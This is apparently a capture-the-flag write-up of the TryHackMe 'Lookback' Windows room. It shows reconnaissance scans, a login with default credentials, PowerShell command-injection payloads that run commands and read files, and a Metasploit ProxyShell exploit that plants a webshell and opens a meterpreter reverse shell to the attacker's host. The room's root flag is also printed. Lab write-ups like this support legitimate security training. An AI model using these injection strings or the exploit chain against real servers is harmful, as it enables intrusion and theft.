---
title: "TryHackMe - Lookback"
date: 2025-04-14 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [powershell, windows, MS Exchange , powershell injection , command injection, CVE-2021-31207, nikto]
---

## Reconnaissance
In begin, I scanned the target IP  with **Nmap** to gather information about the services running on the machine:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -T4 -sC -sV 10.10.34.30       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 11:40 EDT
Nmap scan report for 10.10.34.30
Host is up (0.070s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  ssl/https
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
| http-title: Outlook
|_Requested resource was https://10.10.34.30/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.34.30%2fowa%2f&reason=0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2025-04-13T15:25:21
|_Not valid after:  2025-10-13T15:25:21
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-14T15:40:47+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

To gather further information, I proceeded with **Gobuster** to perform directory enumeration.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.10.34.30 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --exclude-length 0
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.34.30
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/TEST                 (Status: 403) [Size: 1233]
/Test                 (Status: 403) [Size: 1233]
/ecp                  (Status: 302) [Size: 205] [--> https://10.10.34.30/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.34.30%2fecp&reason=0]                                                                                                
Progress: 17077 / 20479 (83.39%)[ERROR] Get "http://10.10.34.30/sapi": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/test                 (Status: 403) [Size: 1233]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```
During the analysis of the results, I came across an interesting path `/TEST`. Upon entering the specified directory, the page required me to provide a username and password.

Further, I used **Nikto** to perform a web vulnerability scan.
```console

┌──(kali㉿kali)-[~/Desktop]
└─$ nikto -h http://10.10.34.30
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.34.30
+ Target Hostname:    10.10.34.30
+ Target Port:        80
+ Start Time:         2025-04-14 11:52:37 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ All CGI directories 'found', use '-C none' to test none
+ /Autodiscover/Autodiscover.xml: Retrieved x-powered-by header: ASP.NET.
+ /Autodiscover/Autodiscover.xml: Uncommon header 'x-feserver' found, with contents: WIN-12OUO7A66M7.
+ /Rpc: Uncommon header 'request-id' found, with contents: d67805db-8e12-4876-8ed8-8f5aa0bdb228.
+ /Rpc: Default account found for '' at (ID 'admin', PW 'admin'). Generic account discovered.. See: CWE-16

```

Thanks to **Nikto**, I discovered the default account with the username `admin` and the password `admin`, which was crucial for gaining access to the login panel. After logging in, I gained access to the internal server resources and the first flag.

![flag1](/images/lookback/firstflag.jpg)

## PowerShell Injection

After further examining the server, I noticed that when I entered a random value in the Path field of the login form, in this case, `etc`, an error related to PowerShell appeared.


```console
Get-Content : Cannot find path 'C:\etc' because it does not exist.
At line:1 char:1
+ Get-Content('C:\etc')
+ ~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\etc:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
 ```

This information allowed me to prepare PowerShell command, specifically an "escape" payload, which executes my command.


 ```
 BitlockerActiveMonitoringLogs'); whoami; #(
```

```console
List generated at 3:27:32 PM.
thm\admin
```
This payload closes the original string, ends the current function or command (e.g., Get-Log(...)), and then introduces the custom `whoami` command, which is executed by the system interpreter. The `#` symbol makes everything after it a comment, allowing the rest of the original command to be hidden and avoiding syntax errors. As a result, after executing the initial function, the system runs `whoami`, which returns the name of the logged-in user.
I can use this to execute my own commands through PowerShell. 
<br>I begin by searching through the files.

```
BitlockerActiveMonitoringLogs'); dir C:\; #(
```

```console

    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023  11:44 AM                934484d0a9de05fc41a4dc84                                              
d-----        1/26/2023  10:36 AM                ExchangeSetupLogs                                                     
d-----        1/25/2023  12:12 PM                inetpub                                                               
d-----        9/15/2018  12:19 AM                PerfLogs                                                              
d-r---        2/28/2023   2:23 PM                Program Files                                                         
d-----        1/25/2023  11:41 AM                Program Files (x86)                                                   
d-----        1/25/2023   1:34 PM                root                                                                  
d-r---        1/26/2023   1:16 PM                Users                                                                 
d-----        3/29/2023   2:34 AM                Windows                                                               
-a----        4/14/2025   8:27 AM             31 BitlockerActiveMonitoringLogs                                         
```

I continue searching through the user's files. On the dev account, at the exact path `C:\Users\dev\Desktop\user.txt`, I find another flag and read it using...
```
BitlockerActiveMonitoringLogs'); Get-Content C:\Users\dev\Desktop\user.txt; #(
```

While testing different methods, I noticed that files from the desktop of the `dev` user can also be accessed simply by specifying the direct path to the desktop. This approach is definitely easier, though less flexible.

![simplepath](/images/lookback/simple.jpg)

## Root access
In the file `todo.txt`, which is also located on the `Desktop`, I found the following notes:

```


List generated at 3:27:32 PM.
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```
What caught my attention was the mention of `"Install the Security Update for MS Exchange [TO BE DONE]."`

I search through the system files to find anything related to **Exchange** and find the following logs:

```
BitlockerActiveMonitoringLogs'); Get-Content C:\ExchangeSetupLogs\UpdateCas.log  ;  #(
```

![exversion](/images/lookback/exchange%20version.png)

Now that I know the version of the installed MS Exchange service, I begin searching the web for existing exploits and come across [this vulnerability](https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxyshell_rce/).


I launch **Metasploit**, search the database, select the appropriate exploit, configure it accordingly, and execute it.

```console
msf6 > search CVE-2021-31207

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxyshell_rce  2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   1    \_ target: Windows Powershell               .                .          .      .
   2    \_ target: Windows Dropper                  .                .          .      .
   3    \_ target: Windows Command                  .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/exchange_proxyshell_rce                                                                                                                    
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command'

msf6 > use exploit/windows/http/exchange_proxyshell_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/exchange_proxyshell_rce) > show options

Module options (exploit/windows/http/exchange_proxyshell_rce):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   EMAIL                              no        A known email address for this organization
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
                                                sploit/basics/using-metasploit.html
   RPORT             443              yes       The target port (TCP)
   SSL               true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                            no        The URI to use for this exploit (default is random)
   UseAlternatePath  false            yes       Use the IIS root dir as alternate path
   VHOST                              no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on
                                        the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Powershell



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/exchange_proxyshell_rce) > set RHOST 10.10.34.30
RHOST => 10.10.34.30
msf6 exploit(windows/http/exchange_proxyshell_rce) > set LHOST 10.8.x.x
LHOST => 10.8.x.x
msf6 exploit(windows/http/exchange_proxyshell_rce) > set EMAIL dev-infrastracture-team@thm.local
EMAIL => dev-infrastracture-team@thm.local
msf6 exploit(windows/http/exchange_proxyshell_rce) > exploit
[*] Started reverse TCP handler on 10.8.x.x:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
[+] Successfully assigned the 'Mailbox Import Export' role
[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)
[*] Saving a draft email with subject '6Czf7HB4R' containing the attachment with the embedded webshell
[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\apDaboA9.aspx
[*] Waiting for the export request to complete...
[+] The mailbox export request has completed
[*] Triggering the payload
[*] Sending stage (203846 bytes) to 10.10.34.30
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\apDaboA9.aspx
[*] Meterpreter session 1 opened (10.8.x.x:4444 -> 10.10.34.30:13213) at 2025-04-14 12:58:17 -0400
[*] Removing the mailbox export request
[*] Removing the draft email

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 13648 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

```


After successfully initializing the payload, all that remained was to search through the files and read the root flag. After navigating through a few directories, I found it in the `Documents` folder.

```console
c:\Users\Administrator\Documents>type flag.txt
type flag.txt
THM{Looking_Back_Is_Not_Always_Bad}
c:\Users\Administrator\Documents>
```